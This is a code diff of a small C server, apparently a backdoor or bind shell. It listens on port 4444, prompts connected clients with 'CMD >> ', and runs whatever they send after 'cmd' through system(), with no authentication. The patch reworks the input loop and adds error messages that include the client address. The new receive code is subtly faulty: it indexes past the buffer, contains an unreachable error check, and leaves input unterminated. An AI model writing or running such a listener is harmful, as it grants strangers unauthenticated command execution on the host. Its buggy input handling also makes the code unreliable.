@@ -27,12 +27,11 @@
 #define MY_PORT 4444
 #define VERSION_NUMBER "v0.02"
 
-void handle_clients();
-
 int main(argc,argv)
 	int argc;
 	char **argv;
 {
+	void handle_clients();
 	int serverfd;
 	struct sockaddr_in server;
 	char buf[BUFSIZ];
@@ -107,7 +106,7 @@ int main(argc,argv)
 			if(send(clientfd,msg,strlen(msg),0) != strlen(msg)) {
 				puts("Couldn't send intro text.\n");
 			}
-			handle_clients(&clientfd);
+			handle_clients(&clientfd,inet_ntoa(client.sin_addr));
 #if defined(_WIN32)
 			if(closesocket(clientfd) == 0) {
 				printf("%s:%d client disconnected.\n",
@@ -135,49 +134,57 @@ int main(argc,argv)
 	return 0;
 }
 
-void handle_clients(socket)
+void handle_clients(socket,address)
 	int *socket;
+	const char *address;
 {
 	char msg[256];
-	char buf[128];
 	char cmd[128];
-	int i;
-	int c;
+	int bytes;
 
-	do {
-		memset(buf,0,sizeof(buf));
-		memset(cmd,0,sizeof(cmd));
+	memset(msg,0,sizeof(msg));
+	memset(cmd,0,sizeof(cmd));
+	while(1) {
 		send(*socket,"CMD >> ",7,0);
-		for(i=0; i<sizeof(buf); ++i) {
-			recv(*socket,&c,1,0);
-			buf[i] = c;
-			if(buf[i] == 0x0A || c == 0x0D) {
+		bytes = 0;
+		while((bytes = recv(*socket,cmd,sizeof(cmd),0)) > 0) {
+			if(bytes < 0) {
+				sprintf(msg,"Error: receiving from %s.\r\n",
+					address);
+				send(*socket,msg,strlen(msg),0);
+				break;
+			}
+			if(cmd[bytes] == 10 || cmd[bytes] == 13) {
 				break;
 			}
 		}
-		sscanf(buf,"%[^\r]s",cmd);
 
 		if(strcmp(cmd,"exit") == 0) {
 			break;
 		} else if(strcmp(cmd,"help") == 0) {
-			memset(msg,0,sizeof(msg));
-			sprintf(msg,"Commands: [exit,help]\r\n");
+			sprintf(msg,"Commands: [exit,cmd,help]\r\n");
 			send(*socket,msg,strlen(msg),0);
 		} else if(strcmp(cmd,"cmd") == 0) {
-			memset(buf,0,sizeof(buf));
 			memset(cmd,0,sizeof(cmd));
 			send(*socket,"Enter command: ",15,0);
-			for(i=0; i<sizeof(buf); ++i) {
-				recv(*socket,&c,1,0);
-				buf[i] = c;
-				if(buf[i] == 0x0A || c == 0x0D) {
+			bytes = 0;
+			while((bytes = recv(*socket,cmd,sizeof(cmd),0)) > 0) {
+				if(bytes < 0) {
+					sprintf(msg,"Error: receiving from %s.\r\n",
+						address);
+					send(*socket,msg,strlen(msg),0);
+					break;
+				}
+				if(cmd[bytes] == 10 || cmd[bytes] == 13) {
 					break;
 				}
 			}
-			sscanf(buf,"%[^\r]s",cmd);
 			system(cmd);
 		} else {
-			send(*socket,"Unknown command.\r\n",18,0);
+			sprintf(msg,"Unknown command.\r\n");
+			send(*socket,msg,strlen(msg),0);
 		}
-	} while(1);
+		memset(msg,0,sizeof(msg));
+		memset(cmd,0,sizeof(cmd));
+	}
 }
